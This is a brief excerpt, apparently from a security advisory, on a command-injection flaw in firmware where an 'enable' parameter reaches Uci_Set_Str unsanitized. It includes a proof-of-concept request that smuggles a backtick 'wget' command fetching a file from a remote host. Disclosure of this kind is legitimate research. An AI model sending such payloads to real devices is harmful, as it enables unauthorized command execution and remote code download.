...
In sub_42348C function, it reads in a user-provided parameter `enable` and passes its value to Uci_Set_Str function,which is defined in libcscommon.so.
...
{"topicurl":"setAppCfg","typeid":"1","enable":"`wget 192.168.6.1:7777/testpoc`"
}
```
